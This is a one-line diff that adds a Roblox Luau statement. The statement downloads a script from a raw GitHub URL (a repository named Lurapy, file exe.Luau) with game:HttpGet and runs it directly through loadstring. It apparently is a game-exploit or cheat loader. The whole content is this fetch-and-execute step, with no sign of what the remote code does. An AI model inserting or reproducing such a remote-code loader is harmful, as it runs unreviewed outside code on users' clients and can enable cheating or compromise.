@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/kust3r/Lurapy/refs/heads/main/exe.Luau"))()
